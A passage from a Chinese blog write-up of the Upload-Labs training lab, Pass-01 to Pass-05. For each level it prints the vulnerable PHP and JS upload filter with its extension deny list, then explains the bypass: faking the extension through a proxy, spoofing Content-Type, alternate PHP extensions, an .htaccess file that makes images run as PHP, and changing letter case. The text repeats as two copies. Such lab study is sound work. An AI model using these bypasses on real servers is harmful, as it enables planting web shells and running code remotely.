class=\"string\">&#x27;.jsp&#x27;</span>);</span><br><span class=\"line\">        <span class=\"variable\">$file_name</span> = trim(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>]);</span><br><span class=\"line\">        <span class=\"variable\">$file_name</span> = deldot(<span class=\"variable\">$file_name</span>);<span class=\"comment\">//删除文件名末尾的点</span></span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = strrchr(<span class=\"variable\">$file_name</span>, <span class=\"string\">&#x27;.&#x27;</span>);</span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = strtolower(<span class=\"variable\">$file_ext</span>); <span class=\"comment\">//转换为小写</span></span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = str_ireplace(<span class=\"string\">&#x27;::$DATA&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, <span class=\"variable\">$file_ext</span>);<span class=\"comment\">//去除字符串::$DATA</span></span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = trim(<span class=\"variable\">$file_ext</span>); <span class=\"comment\">//收尾去空</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!in_array(<span class=\"variable\">$file_ext</span>, <span class=\"variable\">$deny_ext</span>)) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$temp_file</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>];</span><br><span class=\"line\">            <span class=\"variable\">$img_path</span> = UPLOAD_PATH.<span class=\"string\">&#x27;/&#x27;</span>.date(<span class=\"string\">&quot;YmdHis&quot;</span>).rand(<span class=\"number\">1000</span>,<span class=\"number\">9999</span>).<span class=\"variable\">$file_ext</span>;            </span><br><span class=\"line\">            <span class=\"keyword\">if</span> (move_uploaded_file(<span class=\"variable\">$temp_file</span>,<span class=\"variable\">$img_path</span>)) &#123;</span><br><span class=\"line\">                 <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;上传出错！&#x27;</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = UPLOAD_PATH . <span class=\"string\">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​    发现只过滤了<code>.asp、.aspx、.php、.jsp</code>文件，那么可以使用<code>php3、phtml、phps、php5</code>文件绕过过滤，并执行语句。通常，在嵌入了php脚本的html中，使用 <code>phtml</code>作为后缀名；而php3，我的理解是php之前版本的文件后缀，如<code>php5</code>。</p>\n<p>​    直接把<code>2333.php</code>改为<code>2333.php3</code>上传打开，执行成功。完工</p>\n<p><img src=\"https://s1.ax1x.com/2020/11/09/BTq2cV.png\"></p>\n<h2 id=\"Pass-04\"><a href=\"#Pass-04\" class=\"headerlink\" title=\"Pass-04\"></a>Pass-04</h2><p>源码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$is_upload</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"variable\">$msg</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$deny_ext</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&quot;.php&quot;</span>,<span class=\"string\">&quot;.php5&quot;</span>,<span class=\"string\">&quot;.php4&quot;</span>,<span class=\"string\">&quot;.php3&quot;</span>,<span class=\"string\">&quot;.php2&quot;</span>,<span class=\"string\">&quot;php1&quot;</span>,<span class=\"string\">&quot;.html&quot;</span>,<span class=\"string\">&quot;.htm&quot;</span>,<span class=\"string\">&quot;.phtml&quot;</span>,<span class=\"string\">&quot;.pht&quot;</span>,<span class=\"string\">&quot;.pHp&quot;</span>,<span class=\"string\">&quot;.pHp5&quot;</span>,<span class=\"string\">&quot;.pHp4&quot;</span>,<span class=\"string\">&quot;.pHp3&quot;</span>,<span class=\"string\">&quot;.pHp2&quot;</span>,<span class=\"string\">&quot;pHp1&quot;</span>,<span class=\"string\">&quot;.Html&quot;</span>,<span class=\"string\">&quot;.Htm&quot;</span>,<span class=\"string\">&quot;.pHtml&quot;</span>,<span class=\"string\">&quot;.jsp&quot;</span>,<span class=\"string\">&quot;.jspa&quot;</span>,<span class=\"string\">&quot;.jspx&quot;</span>,<span class=\"string\">&quot;.jsw&quot;</span>,<span class=\"string\">&quot;.jsv&quot;</span>,<span class=\"string\">&quot;.jspf&quot;</span>,<span class=\"string\">&quot;.jtml&quot;</span>,<span class=\"string\">&quot;.jSp&quot;</span>,<span class=\"string\">&quot;.jSpx&quot;</span>,<span class=\"string\">&quot;.jSpa&quot;</span>,<span class=\"string\">&quot;.jSw&quot;</span>,<span class=\"string\">&quot;.jSv&quot;</span>,<span class=\"string\">&quot;.jSpf&quot;</span>,<span class=\"string\">&quot;.jHtml&quot;</span>,<span class=\"string\">&quot;.asp&quot;</span>,<span class=\"string\">&quot;.aspx&quot;</span>,<span class=\"string\">&quot;.asa&quot;</span>,<span class=\"string\">&quot;.asax&quot;</span>,<span class=\"string\">&quot;.ascx&quot;</span>,<span class=\"string\">&quot;.ashx&quot;</span>,<span class=\"string\">&quot;.asmx&quot;</span>,<span class=\"string\">&quot;.cer&quot;</span>,<span class=\"string\">&quot;.aSp&quot;</span>,<span class=\"string\">&quot;.aSpx&quot;</span>,<span class=\"string\">&quot;.aSa&quot;</span>,<span class=\"string\">&quot;.aSax&quot;</span>,<span class=\"string\">&quot;.aScx&quot;</span>,<span class=\"string\">&quot;.aShx&quot;</span>,<span class=\"string\">&quot;.aSmx&quot;</span>,<span class=\"string\">&quot;.cEr&quot;</span>,<span class=\"string\">&quot;.sWf&quot;</span>,<span class=\"string\">&quot;.swf&quot;</span>);</span><br><span class=\"line\">        <span class=\"variable\">$file_name</span> = trim(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>]);</span><br><span class=\"line\">        <span class=\"variable\">$file_name</span> = deldot(<span class=\"variable\">$file_name</span>);<span class=\"comment\">//删除文件名末尾的点</span></span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = strrchr(<span class=\"variable\">$file_name</span>, <span class=\"string\">&#x27;.&#x27;</span>);</span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = strtolower(<span class=\"variable\">$file_ext</span>); <span class=\"comment\">//转换为小写</span></span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = str_ireplace(<span class=\"string\">&#x27;::$DATA&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, <span class=\"variable\">$file_ext</span>);<span class=\"comment\">//去除字符串::$DATA</span></span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = trim(<span class=\"variable\">$file_ext</span>); <span class=\"comment\">//收尾去空</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!in_array(<span class=\"variable\">$file_ext</span>, <span class=\"variable\">$deny_ext</span>)) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$temp_file</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>];</span><br><span class=\"line\">            <span class=\"variable\">$img_path</span> = UPLOAD_PATH.<span class=\"string\">&#x27;/&#x27;</span>.<span class=\"variable\">$file_name</span>;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (move_uploaded_file(<span class=\"variable\">$temp_file</span>, <span class=\"variable\">$img_path</span>)) &#123;</span><br><span class=\"line\">                <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;上传出错！&#x27;</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;此文件不允许上传!&#x27;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = UPLOAD_PATH . <span class=\"string\">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​    好家伙，这次直接一大堆文件都被过滤了，几乎有问题的都在数组里。发现没有.<code>htaccess</code>文件过滤，所以上传一个.<code>htaccess</code>文件内容如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure>\n\n<p>​    原理的话我讲一下个人的见解：.<code>htaccess</code>文件是一个<code>apache</code>服务器的配置文件，它的作用就是对于该目录下的所有文件都需要符合这个配置文件。然后上传的文件内容作用是：所有文件访问时都会解析为<code>php</code>。参考的博客：<a href=\"https://www.cnblogs.com/gyrgyr/p/10773118.html\">htaccess使用方法介绍</a>。</p>\n<p>​    接下来上传<code>2333.jpg</code>图片木马，再打开就会被成功解析为<code>php</code>文件并执行：</p>\n<p><img src=\"https://s1.ax1x.com/2020/11/09/BTqoN9.png\"></p>\n<p><img src=\"https://s1.ax1x.com/2020/11/09/BTqqc6.png\"></p>\n<p>​    完工</p>\n<h2 id=\"Pass-05\"><a href=\"#Pass-05\" class=\"headerlink\" title=\"Pass-05\"></a>Pass-05</h2><p> 源码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$is_upload</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"variable\">$msg</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$deny_ext</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&quot;.php&quot;</span>,<span class=\"string\">&quot;.php5&quot;</span>,<span class=\"string\">&quot;.php4&quot;</span>,<span class=\"string\">&quot;.php3&quot;</span>,<span class=\"string\">&quot;.php2&quot;</span>,<span class=\"string\">&quot;.html&quot;</span>,<span class=\"string\">&quot;.htm&quot;</span>,<span class=\"string\">&quot;.phtml&quot;</span>,<span class=\"string\">&quot;.pht&quot;</span>,<span class=\"string\">&quot;.pHp&quot;</span>,<span class=\"string\">&quot;.pHp5&quot;</span>,<span class=\"string\">&quot;.pHp4&quot;</span>,<span class=\"string\">&quot;.pHp3&quot;</span>,<span class=\"string\">&quot;.pHp2&quot;</span>,<span class=\"string\">&quot;.Html&quot;</span>,<span class=\"string\">&quot;.Htm&quot;</span>,<span class=\"string\">&quot;.pHtml&quot;</span>,<span class=\"string\">&quot;.jsp&quot;</span>,<span class=\"string\">&quot;.jspa&quot;</span>,<span class=\"string\">&quot;.jspx&quot;</span>,<span class=\"string\">&quot;.jsw&quot;</span>,<span class=\"string\">&quot;.jsv&quot;</span>,<span class=\"string\">&quot;.jspf&quot;</span>,<span class=\"string\">&quot;.jtml&quot;</span>,<span class=\"string\">&quot;.jSp&quot;</span>,<span class=\"string\">&quot;.jSpx&quot;</span>,<span class=\"string\">&quot;.jSpa&quot;</span>,<span class=\"string\">&quot;.jSw&quot;</span>,<span class=\"string\">&quot;.jSv&quot;</span>,<span class=\"string\">&quot;.jSpf&quot;</span>,<span class=\"string\">&quot;.jHtml&quot;</span>,<span class=\"string\">&quot;.asp&quot;</span>,<span class=\"string\">&quot;.aspx&quot;</span>,<span class=\"string\">&quot;.asa&quot;</span>,<span class=\"string\">&quot;.asax&quot;</span>,<span class=\"string\">&quot;.ascx&quot;</span>,<span class=\"string\">&quot;.ashx&quot;</span>,<span class=\"string\">&quot;.asmx&quot;</span>,<span class=\"string\">&quot;.cer&quot;</span>,<span class=\"string\">&quot;.aSp&quot;</span>,<span class=\"string\">&quot;.aSpx&quot;</span>,<span class=\"string\">&quot;.aSa&quot;</span>,<span class=\"string\">&quot;.aSax&quot;</span>,<span class=\"string\">&quot;.aScx&quot;</span>,<span class=\"string\">&quot;.aShx&quot;</span>,<span class=\"string\">&quot;.aSmx&quot;</span>,<span class=\"string\">&quot;.cEr&quot;</span>,<span class=\"string\">&quot;.sWf&quot;</span>,<span class=\"string\">&quot;.swf&quot;</span>,<span class=\"string\">&quot;.htaccess&quot;</span>);</span><br><span class=\"line\">        <span class=\"variable\">$file_name</span> = trim(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>]);</span><br><span class=\"line\">        <span class=\"variable\">$file_name</span> = deldot(<span class=\"variable\">$file_name</span>);<span class=\"comment\">//删除文件名末尾的点</span></span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = strrchr(<span class=\"variable\">$file_name</span>, <span class=\"string\">&#x27;.&#x27;</span>);</span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = str_ireplace(<span class=\"string\">&#x27;::$DATA&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, <span class=\"variable\">$file_ext</span>);<span class=\"comment\">//去除字符串::$DATA</span></span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = trim(<span class=\"variable\">$file_ext</span>); <span class=\"comment\">//首尾去空</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!in_array(<span class=\"variable\">$file_ext</span>, <span class=\"variable\">$deny_ext</span>)) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$temp_file</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>];</span><br><span class=\"line\">            <span class=\"variable\">$img_path</span> = UPLOAD_PATH.<span class=\"string\">&#x27;/&#x27;</span>.date(<span class=\"string\">&quot;YmdHis&quot;</span>).rand(<span class=\"number\">1000</span>,<span class=\"number\">9999</span>).<span class=\"variable\">$file_ext</span>;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (move_uploaded_file(<span class=\"variable\">$temp_file</span>, <span class=\"variable\">$img_path</span>)) &#123;</span><br><span class=\"line\">                <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;上传出错！&#x27;</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = UPLOAD_PATH . <span class=\"string\">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​    细心的话可以发现，这道题的源码中在末尾添加了<code>.htaccess</code>文件过滤，但是也少了一条语句</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$file_ext</span> = strtolower(<span class=\"variable\">$file_ext</span>); <span class=\"comment\">//转换为小写</span></span><br></pre></td></tr></table></figure>\n\n<p>目标就很明确了，直接使用大小写绕过过滤。</p>\n<p><img src=\"https://s1.ax1x.com/2020/11/09/BTLmNj.png\"></p>\n<p>​    打开图片成功执行。完工</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"介绍\"><a href=\"#介绍\" class=\"headerlink\" title=\"介绍\"></a>介绍</h2><blockquote>\n<p>大部分的网站和应用系统都有上传功能，而程序员在开发任意文件上传功能时，并未考虑文件格式后缀的合法性校验或者是否只在前端通过js进行后缀检验。这时攻击者可以上传一个与网站脚本语言相对应的恶意代码动态脚本，例如(jsp、asp、php、aspx文件后缀)到服务器上，从而访问这些恶意脚本中包含的恶意代码，进行动态解析最终达到执行恶意代码的效果，进一步影响服务器安全。</p>\n</blockquote>\n<p>在线靶机地址：</p>\n<ul>\n<li><a href=\"https://buuoj.cn/challenges#Upload-Labs-Linux\">linux环境</a></li>\n<li><a href=\"https://buuoj.cn/challenges#[Windows]Upload-Labs-Windows\">windows环境</a></li>\n</ul>\n<h2 id=\"Pass-01\"><a href=\"#Pass-01\" class=\"headerlink\" title=\"Pass-01\"></a>Pass-01</h2><p>​    尝试上传php木马，发现提示上传错误</p>\n<p><img src=\"https://s1.ax1x.com/2020/11/08/BTKbfs.png\"></p>\n<p>​    提示只能上传<code>jpg、png、gif</code>类型的图片。查看源码发现是一个前端的后缀过滤，那么我们尝试绕过前端的JS代码。</p>\n<p>​    源码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">checkFile</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> file = <span class=\"built_in\">document</span>.getElementsByName(<span class=\"string\">&#x27;upload_file&#x27;</span>)[<span class=\"number\">0</span>].value;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (file == <span class=\"literal\">null</span> || file == <span class=\"string\">&quot;&quot;</span>) &#123;</span><br><span class=\"line\">        alert(<span class=\"string\">&quot;请选择要上传的文件!&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//定义允许上传的文件类型</span></span><br><span class=\"line\">    <span class=\"keyword\">var</span> allow_ext = <span class=\"string\">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class=\"line\">    <span class=\"comment\">//提取上传文件的类型</span></span><br><span class=\"line\">    <span class=\"keyword\">var</span> ext_name = file.substring(file.lastIndexOf(<span class=\"string\">&quot;.&quot;</span>));</span><br><span class=\"line\">    <span class=\"comment\">//判断上传文件类型是否允许上传</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (allow_ext.indexOf(ext_name + <span class=\"string\">&quot;|&quot;</span>) == -<span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> errMsg = <span class=\"string\">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class=\"string\">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;</span><br><span class=\"line\">        alert(errMsg);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>​    把文件后缀名改成jpg格式上传，使用<strong>burp suit</strong>抓包。把<code>.jpg</code>后缀重新改为<code>.php</code>即可实现绕过前端JS代码。</p>\n<p><img src=\"https://s1.ax1x.com/2020/11/08/BTM5g1.png\"></p>\n<p>​    然后右键打开图片，代码成功执行。完工</p>\n<p><img src=\"https://s1.ax1x.com/2020/11/08/BTQV8s.png\"></p>\n<p>​    注：后面题目的php代码都使用<code>2333.php</code>：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> <span class=\"keyword\">eval</span>(phpinfo());</span><br></pre></td></tr></table></figure>\n\n<p>​    执行结果是打印出php版本信息。</p>\n<h2 id=\"Pass-02\"><a href=\"#Pass-02\" class=\"headerlink\" title=\"Pass-02\"></a>Pass-02</h2><p>​    源码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$is_upload</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"variable\">$msg</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ((<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;type&#x27;</span>] == <span class=\"string\">&#x27;image/jpeg&#x27;</span>) || (<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;type&#x27;</span>] == <span class=\"string\">&#x27;image/png&#x27;</span>) || (<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;type&#x27;</span>] == <span class=\"string\">&#x27;image/gif&#x27;</span>)) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$temp_file</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>];</span><br><span class=\"line\">            <span class=\"variable\">$img_path</span> = UPLOAD_PATH . <span class=\"string\">&#x27;/&#x27;</span> . <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>]            </span><br><span class=\"line\">            <span class=\"keyword\">if</span> (move_uploaded_file(<span class=\"variable\">$temp_file</span>, <span class=\"variable\">$img_path</span>)) &#123;</span><br><span class=\"line\">                <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;上传出错！&#x27;</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;文件类型不正确，请重新上传！&#x27;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = UPLOAD_PATH.<span class=\"string\">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​    发现文件判断是根据<code>image/jpeg、image/png...</code>进行过滤判定，这些值都是Http请求中的<strong>Content-Type</strong>常见的值，通常浏览网页中各种各样的文件类型的就是通过它判断。那么这道题的目标就是绕过它。贴一个我参考值种类的博客:<a href=\"https://www.cnblogs.com/klb561/p/10090540.html\">Http请求中Content-Type</a>。</p>\n<p>​    同样是burp抓包修改<strong>Content-Type</strong>的值。</p>\n<p><img src=\"https://s1.ax1x.com/2020/11/08/BT1EXq.png\"></p>\n<p>​    打开图片，php代码成功执行。完工</p>\n<h2 id=\"Pass-03\"><a href=\"#Pass-03\" class=\"headerlink\" title=\"Pass-03\"></a>Pass-03</h2><p>源码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$is_upload</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"variable\">$msg</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$deny_ext</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&#x27;.asp&#x27;</span>,<span class=\"string\">&#x27;.aspx&#x27;</span>,<span class=\"string\">&#x27;.php&#x27;</span>,<span class=\"string\">&#x27;.jsp&#x27;</span>);</span><br><span class=\"line\">        <span class=\"variable\">$file_name</span> = trim(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>]);</span><br><span class=\"line\">        <span class=\"variable\">$file_name</span> = deldot(<span class=\"variable\">$file_name</span>);<span class=\"comment\">//删除文件名末尾的点</span></span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = strrchr(<span class=\"variable\">$file_name</span>, <span class=\"string\">&#x27;.&#x27;</span>);</span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = strtolower(<span class=\"variable\">$file_ext</span>); <span class=\"comment\">//转换为小写</span></span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = str_ireplace(<span class=\"string\">&#x27;::$DATA&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, <span class=\"variable\">$file_ext</span>);<span class=\"comment\">//去除字符串::$DATA</span></span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = trim(<span class=\"variable\">$file_ext</span>); <span 